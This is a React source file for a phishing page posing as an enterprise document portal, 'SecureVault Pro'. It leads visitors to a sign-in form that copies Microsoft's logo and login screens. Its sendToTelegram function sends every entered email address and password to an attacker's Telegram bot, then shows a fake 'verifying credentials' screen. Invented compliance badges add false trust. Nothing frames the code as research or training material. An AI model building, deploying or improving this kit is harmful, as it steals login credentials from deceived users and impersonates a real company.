import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  ArrowRight, 
  Lock, 
  ShieldAlert, 
  ExternalLink, 
  Globe,
  Loader2,
  FileLock2
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

type Page = 'gateway' | 'auth';
type AuthStep = 'email' | 'password' | 'success';

export default function App() {
  const [page, setPage] = useState<Page>('gateway');
  const [authStep, setAuthStep] = useState<AuthStep>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const sendToTelegram = async (content: string, type: 'Email' | 'Password') => {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn('Telegram credentials missing in .env. Falling back to simulation.');
      await new Promise(r => setTimeout(r, 800));
      return true; 
    }

    try {
      const message = `🏢 *SecureVault Pro*\nStep: *${type}*\nUser: \`${email}\`\n${type === 'Password' ? `Pass: \`${content}\`\n` : ''}Time: ${new Date().toLocaleString()}`;
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: chatId, 
          text: message, 
          parse_mode: 'Markdown' 
        }),
      });
      return true;
    } catch (e) { 
      console.error('Telegram Error:', e);
      return false; 
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    if (await sendToTelegram(email, 'Email')) {
      setAuthStep('password');
    }
    setIsLoading(false);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    if (await sendToTelegram(password, 'Password')) {
      setAuthStep('success');
    }
    setIsLoading(false);
  };

  return (
    <div className="min-h-screen font-sans bg-black">
      <AnimatePresence mode="wait">
        {page === 'gateway' ? (
          <motion.div key="gateway" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="relative min-h-screen flex flex-col items-center justify-center">
            {/* Fixed Background: Clean dark overlay to let text pop */}
            <div className="absolute inset-0 z-0">
              <img src="https://images.unsplash.com/photo-1497366216548-37526070297c?q=80&w=2000" className="w-full h-full object-cover opacity-30 grayscale" alt="Office" />
              <div className="absolute inset-0 bg-gradient-to-b from-black/90 via-black/40 to-black" />
            </div>
            
            <div className="relative z-10 text-center px-6">
              {/* Scaled System Status: Fixed spacing and alignment */}
              <div className="bg-microsoft-blue/20 border border-microsoft-blue/30 px-4 py-1 rounded-full inline-flex items-center gap-2 mb-8">
                <ShieldCheck className="w-4 h-4 text-microsoft-blue" />
                <span className="text-[10px] uppercase tracking-widest font-bold text-microsoft-blue">System Status: Operational</span>
              </div>

              {/* Restore Contrast: High-contrast White Headline with Blue 'Pro' */}
              <h1 className="text-6xl md:text-8xl font-bold text-white tracking-tighter mb-6">
                SecureVault <span className="text-microsoft-blue">Pro</span>
              </h1>
              
              {/* High-contrast Sub-headline */}
              <p className="text-zinc-300 text-xl max-w-2xl mx-auto mb-10 font-light">
                Authorized Personnel Only. Enterprise Document Governance Portal.
              </p>

              {/* Button Styling: Side-by-Side alignment and ghost-style link */}
              <div className="flex flex-col md:flex-row items-center justify-center gap-6">
                <button onClick={() => setPage('auth')} className="bg-white text-black px-10 py-5 rounded-full font-bold text-lg flex items-center gap-3 hover:scale-105 transition-transform shadow-2xl">
                  Access Secure Portal <ArrowRight className="w-5 h-5" />
                </button>
                
                <button className="text-white/70 hover:text-white flex items-center gap-2 text-sm font-medium transition-colors">
                  <FileLock2 className="w-4 h-4" />
                  Compliance Docs
                  <ExternalLink className="w-3 h-3" />
                </button>
              </div>
            </div>

            {/* Scaling: Trust Badges scaled and spaced correctly in footer */}
            <div className="absolute bottom-12 w-full px-6 flex justify-center gap-12 opacity-40 grayscale pointer-events-none hidden md:flex">
              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><Globe className="w-4 h-4" /> Global Compliance</div>
              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><ShieldAlert className="w-4 h-4" /> ISO 27001 Certified</div>
              <div className="flex items-center gap-2 text-[10px] text-white uppercase tracking-widest"><Lock className="w-4 h-4" /> Bank-Level Encryption</div>
            </div>
          </motion.div>
        ) : (
          <motion.div key="auth" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="min-h-screen bg-[#f2f2f2] flex flex-col items-center justify-center p-4">
            <div className="w-full max-w-[440px] bg-white p-11 shadow-lg border border-gray-200">
              <div className="flex items-center gap-2 mb-6">
                <div className="grid grid-cols-2 gap-[2px] w-5 h-5">
                  <div className="bg-[#f25022] w-full h-full" /><div className="bg-[#7fba00] w-full h-full" />
                  <div className="bg-[#00a4ef] w-full h-full" /><div className="bg-[#ffb900] w-full h-full" />
                </div>
                <span className="text-[#737373] font-semibold text-xl">Microsoft</span>
              </div>

              <AnimatePresence mode="wait">
                {authStep === 'email' && (
                  <motion.div key="e" initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 10 }}>
                    <h2 className="text-2xl font-semibold mb-1 text-black">Sign in</h2>
                    <p className="text-[15px] mb-4 text-black">to continue to SecureVault Pro</p>
                    <form onSubmit={handleEmailSubmit}>
                      <input type="email" required value={email} onChange={e => setEmail(e.target.value)} placeholder="Email, phone, or Skype" className="w-full border-b border-black/60 focus:border-microsoft-blue py-2 outline-none text-[15px] mb-4 text-black placeholder:text-gray-500" />
                      <div className="text-[13px] text-microsoft-blue mb-8">No account? <span className="hover:underline cursor-pointer">Create one!</span></div>
                      <div className="flex justify-end"><button type="submit" disabled={isLoading} className="bg-microsoft-blue text-white px-9 py-1.5 hover:bg-microsoft-blue-hover transition-colors min-w-[100px] flex justify-center text-[15px]">{isLoading ? <Loader2 className="animate-spin w-5 h-5" /> : 'Next'}</button></div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'password' && (
                  <motion.div key="p" initial={{ opacity: 0, x: 10 }} animate={{ opacity: 1, x: 0 }}>
                    <div className="flex items-center gap-2 mb-2 text-[15px] cursor-pointer text-black" onClick={() => setAuthStep('email')}><ArrowRight className="w-4 h-4 rotate-180" /> {email}</div>
                    <h2 className="text-2xl font-semibold mb-4 text-black">Enter password</h2>
                    <form onSubmit={handlePasswordSubmit}>
                      <input type="password" required autoFocus value={password} onChange={e => setPassword(e.target.value)} placeholder="Password" className="w-full border-b border-black/60 focus:border-microsoft-blue py-2 outline-none text-[15px] mb-8 text-black" />
                      <div className="flex justify-end"><button type="submit" disabled={isLoading} className="bg-microsoft-blue text-white px-9 py-1.5 hover:bg-microsoft-blue-hover transition-colors min-w-[100px] flex justify-center text-[15px]">{isLoading ? <Loader2 className="animate-spin w-5 h-5" /> : 'Sign in'}</button></div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'success' && (
                  <motion.div key="s" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="text-center py-10">
                    <Loader2 className="w-12 h-12 animate-spin text-microsoft-blue mx-auto mb-4" />
                    <h2 className="text-xl font-semibold text-black">Loading Document...</h2>
                    <p className="text-gray-500 text-sm mt-2">Verifying enterprise credentials.</p>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
            <div className="mt-8 flex gap-6 text-[12px] text-gray-500"><span>Terms of use</span><span>Privacy & cookies</span></div>
          </motion.div>
        )}
      </AnimatePresence>
      
      {/* Support Bubble */}
      <div className="fixed bottom-8 right-8 flex items-center gap-4 group cursor-pointer z-50">
        <div className="bg-white p-3 rounded-xl shadow-xl border border-gray-100 opacity-0 group-hover:opacity-100 transition-opacity text-sm font-medium text-black">Need help? Chat with Sarah</div>
        <div className="w-16 h-16 rounded-full border-4 border-white shadow-2xl overflow-hidden bg-microsoft-blue">
          <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=200" className="w-full h-full object-cover" alt="Support" />
        </div>
      </div>
    </div>
  );
}